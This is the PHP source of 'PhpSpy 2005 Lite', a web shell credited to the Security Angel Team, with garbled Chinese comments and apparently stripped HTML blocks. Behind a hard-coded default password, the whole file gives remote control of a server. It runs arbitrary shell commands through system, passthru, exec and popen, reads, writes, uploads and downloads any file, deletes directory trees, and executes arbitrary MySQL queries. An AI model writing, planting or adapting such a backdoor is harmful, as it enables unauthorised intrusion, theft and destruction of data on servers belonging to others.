<?php
/*
+--------------------------------------------------------------------------+
| str_replace("-", "", "P-h-p-S-p-y") Version:2005 Lite                    |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  Dec 28st(My girl friend's birthday), 2004                         |
+--------------------------------------------------------------------------+
*/

/*
��ʾ��������پ���һЩ�������а�����ע��ȥ����
*/

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*===================== �������� =====================*/

// �Ƿ���Ҫ������֤,1Ϊ��Ҫ��֤,��������Ϊֱ�ӽ���.����ѡ������Ч
$admin['check']="1";

// �����Ҫ������֤,���޸ĵ�½����
$admin['pass']="angel";

/*===================== ���ý��� =====================*/


// ��������� register_globals = off �Ļ����¹���
if ( function_exists('ini_get') ) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];

/*===================== �����֤ =====================*/
if($admin['check']=="1") {
	if ($_GET['action'] == "logout") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">ע���ɹ�......<p><a href=\"".$self."\">������Զ��˳��򵥻������˳��������&gt;&gt;&gt;</a></span>";
		exit;
	}
	if ($login) {
		$adminpass=trim($_POST['adminpass']);
		if ($adminpass==$admin['pass']) {
			setcookie ("adminpass",$admin['pass'],time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">��½�ɹ�......<p><a href=\"".$self."\">������Զ���ת�򵥻��������������&gt;&gt;&gt;</a></span>";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass']!=$admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}//end check
/*===================== ��֤���� =====================*/

// �ж� magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

if ($_GET['action'] == "phpinfo") {
	$dis_func = get_cfg_var("disable_functions");
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() �����ѱ�����,��鿴&lt;PHP��������&gt;";
	exit;
}

// �����ļ�
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('��Ҫ�µ��ļ�������!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// ����Ŀ¼
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ��ȡ��ǰ·��
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// �ж϶�д���
if (dir_writeable($nowpath)) {
	$dir_writeable = "��д";
} else {
	$dir_writeable = "����д";
}

$dis_func = get_cfg_var("disable_functions");
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$shellmode=(!get_cfg_var("safe_mode")) ? " | <a href=\"?action=shell\">WebShell</a>" : "";
?><?php
/*===================== ִ�в��� ��ʼ =====================*/
echo "<p><b>\n";
// ɾ���ļ�
if(@$delfile!="") {
	if(file_exists($delfile)) {
		if (@unlink($delfile)) {
			echo "".$delfile." ɾ���ɹ�!";
		} else {
			echo "�ļ�ɾ��ʧ��!";
		}
	} else {
		echo "�ļ��Ѳ�����,ɾ��ʧ��!";
	}
}

// ɾ��Ŀ¼
elseif($rmdir) {
	if($deldir!="") {
		$deldirs="$dir/$deldir";
		if(!file_exists("$deldirs")) {
			echo "Ŀ¼�Ѳ�����!";
		} else {
			deltree($deldirs);
		}
	} else {
		echo "ɾ��ʧ��!";
	}
}

// �ϴ��ļ�
elseif($uploadfile) {
	echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadmyfile']['name']."") ? "�ϴ��ɹ�!" : "�ϴ�ʧ��!";
}

// �༭�ļ�
elseif($doeditfile) {
	$filename="$editfilename";
	@$fp=fopen("$filename","w");
	echo $msg=@fwrite($fp,$_POST['filecontent']) ? "д���ļ��ɹ�!" : "д��ʧ��!";
	@fclose($fp);
}

// ����MYSQL
elseif($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "���ݿ����ӳɹ�!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// ִ��SQL���
elseif($doquery) {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
	@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQL���ɹ�ִ��" : "����: ".mysql_error();
	mysql_close();
}

// �鿴PHP���ò���״��
elseif($viewphpvar) {
	echo "���ò��� ".$_POST['phpvarname']." �����: ".getphpcfg($_POST['phpvarname'])."";
}

else {
	echo "�������� <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> С�� angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] ��������,���� <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> �������°汾.";
}

echo "</b></p>\n";
/*===================== ִ�в��� ���� =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
?><?php
// Ŀ¼�б�
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$dirperm</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=deldir&dir=".urlencode($dir)."&deldir=".urlencode($file)."\">ɾ��</a></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">�����ϼ�Ŀ¼</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}//while
@closedir($dirs); 
?><?php
}// end dir

elseif ($_GET['action'] == "editfile") {
	if($newfile=="") {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
?><?php
}//end editfile

elseif ($_GET['action'] == "shell") {
	if (!get_cfg_var("safe_mode")) {
?><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} else {
			system($_POST['command']);
		}
	}
	?><?php
	} else {
?><?php
	}
}//end shell

elseif ($_GET['action'] == "deldir") {
?><?php
}//end deldir

elseif ($_GET['action'] == "sql") {
	$servername = isset($servername) ? $servername : 'localhost';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
?><?php
}//end sql query

elseif ($_GET['action'] == "phpenv") {
?><?php
}//end phpenv
?><?php
	debuginfo();
	ob_end_flush();	
	?><?php

/*======================================================
������
======================================================*/

	// ��½���
	function loginpage() {
?><?php
		exit;
	}//end loginpage()

	// ҳ�������Ϣ
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// ȥ��ת���ַ�
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// ɾ��Ŀ¼
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		echo @rmdir($deldir) ? "Ŀ¼ɾ���ɹ�!" : "<font color=\"#ff0000\">Ŀ¼ɾ��ʧ��!</font>";	
	} 

	// �ж϶�д���
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// ����м�ı���ɫ�滻
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// ��ȡ��ǰ���ļ�ϵͳ·��
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// ���PHP���ò���
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return No;
			break;
			case 1:
			return Yes;
			break;
			default:
			return $result;
			break;
		}
	}
?>